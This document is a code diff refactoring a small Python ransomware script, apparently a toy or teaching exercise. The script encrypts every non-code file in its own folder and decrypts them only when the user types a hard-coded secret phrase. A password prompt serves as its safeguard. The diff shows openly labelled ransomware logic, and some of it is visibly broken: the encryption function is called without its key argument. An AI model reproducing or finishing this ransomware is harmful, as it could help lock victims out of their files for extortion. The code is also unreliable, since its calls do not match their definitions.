@@ -37,13 +37,14 @@ def decrypt_file(key, filename):
 
 
 # List of files in folder
-def get_files_in_folder(path):
+def file_paths(path):
 
     files = []
+    code_files = ["maze.py", "decrypt.py", "encrypt.py", "README.md", ".gitignore"]
     for file in os.listdir(path):
 
-        # ignore code files
-        if file == 'README.md' or file == sys.argv[0]:
+        # Ignore code files
+        if file in code_files or file == sys.argv[0]:  #sys.argv[0] == 'script.py'
             continue
 
         file_path = os.path.join(path, file)
@@ -54,14 +55,13 @@ def get_files_in_folder(path):
 
 
 # Encrypt files
-def encrypt_files_in_folder(key, path):
+def encrypt_all_files(key, path):
     
     encrypted_files = 0
-    files = get_files_in_folder(path)
+    files = file_paths(path)
 
-    # Encrypt each file in the directory.
+    # Encrypt each file in path
     for file in files:
-        logging.debug('Encrypting file: {}'.format(file))
         encrypt_file(key, file)
         encrypted_files += 1
 
@@ -69,21 +69,22 @@ def encrypt_files_in_folder(key, path):
 
 
 # Decrypt files
-def decrypt_files_in_folder(key, path):
+def decrypt_all_files(key, path):
     
-    if key != key:
-        print('Wrong key!')
-        return
+    decrypted_files = 0
+    files = file_paths(path)
 
-    files = get_files_in_folder(path)
-
-    # Decrypt each file in the directory.
+    # Decrypt each file in path
     for file in files:
         decrypt_file(key, file)
+        decrypted_files += 1
+
+    return decrypted_files
 
 
 # MAIN FUNCTION 
 if __name__ == '__main__':
+
 
     # Safeguard against running into your own computer
     safeguard = input('Enter the password to run')
@@ -96,14 +97,15 @@ if __name__ == '__main__':
 
     # Encrypt files of same folder (which has maze)
     path = os.path.dirname(os.path.abspath(__file__))
-    number_encrypted_files = encrypt_files_in_folder(path)
-    print('Number of encrypted files: {}'.format(number_encrypted_files))
+    no_encrypted_files = encrypt_all_files(path)
+    print('Number of encrypted files: {}'.format(no_encrypted_files))
 
 
     # Ransomware real work
-    phrase = input('Enter the secret phrase: ')
+    secret_phrase = "Don't let the muggles get you down"
+    user_phrase = input('Enter the secret phrase: ')
 
-    if(input == "Don't let the muggles get you down"):
-        decrypt_files_in_folder(key, path)
+    if(user_phrase == secret_phrase):
+        decrypt_all_files(key, path)
     else:    
-        quit()
+        print("Sorry, rong phrase!")    
